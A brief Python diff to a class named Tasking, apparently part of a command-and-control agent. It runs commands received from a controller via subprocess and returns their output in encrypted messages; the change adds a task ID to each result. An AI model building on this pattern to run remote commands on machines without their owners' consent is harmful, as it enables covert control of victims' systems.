@@ -16,7 +16,7 @@ class Tasking():
             raw_command = command[3]
             executed = subprocess.run(raw_command, capture_output=True)
 
-            response = Message(type=MessageType.RESULT, payload={'output': executed.stdout, 'error': executed.stderr})
+            response = Message(type=MessageType.RESULT, payload={'task_id': command[0], 'output': executed.stdout, 'error': executed.stderr})
 
             data = pack_json(response, Config.encryption_key)
             print(type(data), data)
